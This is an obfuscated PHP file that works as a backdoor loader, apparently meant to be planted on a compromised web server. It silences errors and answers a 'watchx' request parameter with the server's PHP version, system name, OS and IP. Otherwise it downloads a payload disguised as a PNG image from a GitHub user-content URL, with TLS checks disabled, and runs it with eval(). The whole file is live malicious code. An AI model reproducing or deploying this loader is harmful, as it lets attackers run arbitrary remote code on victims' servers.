
<?php

$GLOBALS["lnrkdexmo"] = "result";
$GLOBALS["fcgthfemb"] = "a";
$GLOBALS["kmnpcocuqa"] = "ch";
$GLOBALS["nqusfcueqf"] = "version";
$GLOBALS["mluhaqb"] = "ip";
$GLOBALS["ltnbuthggrc"] = "a";
error_reporting(0);
ini_set("display_errors", 0);
if ($_REQUEST["watchx"]) {
    $wfmjlpuc = "ip";
    $GLOBALS["kumviinoca"] = "version";
    $twcfypprtyn = "uname";
    $version = phpversion();
    $GLOBALS["tvefrhpr"] = "uname";
    $uname = php_uname();
    $ip = gethostbyname($_SERVER["HTTP_HOST"]);
    echo json_encode(array("version" => $version, "uname" => $uname, "platform" => PHP_OS, "ip" => $ip, "workingx" => true));
    die;
}
function get_contents($url)
{
    $wyeeuqehxtz = "ch";
    ${$GLOBALS["kmnpcocuqa"]} = curl_init("{$url}");
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_RETURNTRANSFER, 1);
    $GLOBALS["oxuwprq"] = "ch";
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt(${$wyeeuqehxtz}, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; 32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_SSL_VERIFYHOST, 0);
    $GLOBALS["cbtslil"] = "ch";
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_COOKIEJAR, $GLOBALS["coki"]);
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_COOKIEFILE, $GLOBALS["coki"]);
    ${$GLOBALS["lnrkdexmo"]} = curl_exec($ch);
    return ${$GLOBALS["lnrkdexmo"]};
}
${$GLOBALS["ltnbuthggrc"]} = get_contents("https://private-user-images.githubusercontent.com/110423611/315465601-8fd971f1-7247-47c6-a3ae-fdeb7d537443.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTEwNzI3MjMsIm5iZiI6MTcxMTA3MjQyMywicGF0aCI6Ii8xMTA0MjM2MTEvMzE1NDY1NjAxLThmZDk3MWYxLTcyNDctNDdjNi1hM2FlLWZkZWI3ZDUzNzQ0My5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzIyJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMyMlQwMTUzNDNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iNjc4ZjkyNjU4NWRiNjRkNDExNDMxMGEzZDY2N2ZhY2Y1NTQxOTUwNzZlMDBmOTY1NzcwNTJlMGQ4Mjg3YzU2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9._LRsgyzP4icvTkgh0BcoLdACUzHC_pVWY1nNYPJHK4Y");
eval("?>" . ${$GLOBALS["fcgthfemb"]});